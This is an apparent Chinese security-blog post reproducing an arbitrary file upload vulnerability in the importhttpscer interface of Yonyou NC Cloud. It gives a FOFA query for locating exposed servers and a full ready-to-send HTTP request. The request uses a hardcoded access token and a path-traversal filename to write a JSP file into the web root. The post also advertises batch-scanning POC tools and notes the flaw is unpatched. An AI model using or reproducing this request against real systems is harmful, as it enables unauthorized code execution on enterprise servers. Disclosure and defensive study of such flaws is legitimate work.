#  用友NC Cloud importhttpscer接口存在任意文件上传漏洞   
南风徐来  南风漏洞复现文库   2024-04-04 22:58  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友NC Cloud importhttpscer接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC Cloud importhttpscer接口存在任意文件上传漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreBCic8YVXLxicsBJ5HGC7icicGgCpniauoD7OBcWCiauHDZ8387HYDsTChbPiag/640?wx_fmt=jpeg&from=appmsg "null")  
  
用友NC Cloud importhttpscer接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
app="用友-NC-Cloud"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/nccloud/mob/pfxx/manualload/importhttpscer  
  
漏洞数据包：  
```
POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
Content-Length: 190
Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0

--fd28cb44e829ed1c197ec3bc71748df0
Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/141172.jsp"

<%out.println(1111*1111);%>
--fd28cb44e829ed1c197ec3bc71748df0--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreBDdrEia1g5t2QNOicRpcgbyMg56dO7IngP8iaYHk8rz34LqFb1FY7TdgMg/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传后的路径 http://127.0.0.1/141172.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreBBxr8dfXOMAyWaxwsFtib8Ctljh1OvRWOA9jLdtUynfrVYVEIrTvOoiaQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现116 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreBHXLTVnEUF3mwvTRKc6qGAyGp8SEPbZdpBL7ss4eW31QbKAJOZQ536w/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreB1jk67yku5ygoIBICnEW81421DK5ceFcGPqHxmmOwib0UfXMbAHzDTZA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreBjczIvXnKqENVX9otRcWy7xAjdkJkPaS2Czyib71tZAiacpUhKgoNAYicA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreBeL7ud0Nhg9gfQDdib18m9GPrDR1HKTCyOr6P7dqdjO3yicEYqPab6YlQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreB8s8LTzmySLG7v2j8hUgdWiaCQJtR1FG0IEQ1Kc2UZ7OG8U7v6ia64HSg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreB8gDl6afESVDRFpXX7Ic6jzvGq6TdeQzN22dcNB2R8XCxPicTPy4YoIQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bHTFNUJ59XrHpomicH2hreBKib6mtJ1KKqW8ic1YWuMjibsiaYsr71x31ibE6qBvbnN9iciavAM9pfF7YcIQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.yonyou.com/  
## 8.往期回顾  
  
[鸿运(通天星CMSV6车载)主动安全监控云平台inspect_file/upload存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486000&idx=1&sn=5d24679dac266958d742b78f30b98de9&chksm=974b8737a03c0e2101e726efca54382ffbf79e963e8417fa4fdd6fde8551317cdea99f86c36a&scene=21#wechat_redirect)  
  
  
[用友U8-Cloud FileServlet接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485971&idx=1&sn=1ff418faefa7d29d963287d2dcc9484f&chksm=974b8714a03c0e022db2152ca5aede423908c66bdc70e58877c80847c0d8455ad20f29c6fe25&scene=21#wechat_redirect)  
  
  
  
  
